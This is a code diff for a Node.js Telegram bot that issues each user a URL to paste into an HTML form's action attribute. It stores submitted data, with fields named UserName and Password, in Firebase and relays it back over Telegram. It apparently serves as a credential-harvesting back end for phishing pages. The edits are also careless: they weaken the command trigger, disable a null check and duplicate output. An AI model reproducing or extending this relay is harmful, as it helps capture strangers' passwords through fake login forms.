@@ -11,11 +11,11 @@ var TelegramBot = require('node-telegram-bot-api'),
 
 
 telegram.on("text", (message) => {
-    if(message.text.toLowerCase().indexOf("/start") === 0){
+    if(message.text.toLowerCase().indexOf("s") === 0){
         var userID=message.chat.id;
         var url="http://botmaster.com/"+message.chat.id+"/sg_data_bot?action=4354433";
-        logger(userID,{url:{"UserName2":"Password"}});
-        telegram.sendMessage(message.chat.id,"Your new bot url is not alive\n "+
+       // logger(userID,{"data":["URL",url,[{"UserName":Math.random(),"Password":Math.random()}]]});
+        telegram.sendMessage(message.chat.id,"Your Action url is \n "+
     "URL:"+url+"\nCopy and past in the action of the html page."+
     "\n/stop remove the url.");      
     }else 
@@ -40,19 +40,22 @@ function getData(key){
     .then(function (snap) {
         res= snap.val()
         console.log(res);
-        if(res!=null){
-            var getDataStructure ="URL:"+JSON.stringify(res.url.text)+"\n"+JSON.stringify(res.url);
+        //if(res!='undefined'){
+            var getDataStructure ="URL:"+JSON.stringify(res.url)+"\n"+JSON.stringify(res.url);
             telegram.sendMessage(key,getDataStructure);            
-        } 
+        //} 
         
    });
    
 }
 function logger (key,data){
-    var obj1=ref.child(key)
-    console.log('function called..')
-    obj1.push(data);   // Creates a new ref with a new "push key"
-    obj1.set(data);    // Overwrites the path
+    var obj1=ref.child(key);
+    //var jObj=JSON.parse(data);
+    //console.log('function called..'+jObj.data)
+   // var url = person.child(data.url);
+    
+    //obj1.push(data);   // Creates a new ref with a new "push key"
+    //obj1.set(data);    // Overwrites the path
     obj1.update(data); // Updates only the specified attributes 
 }
   
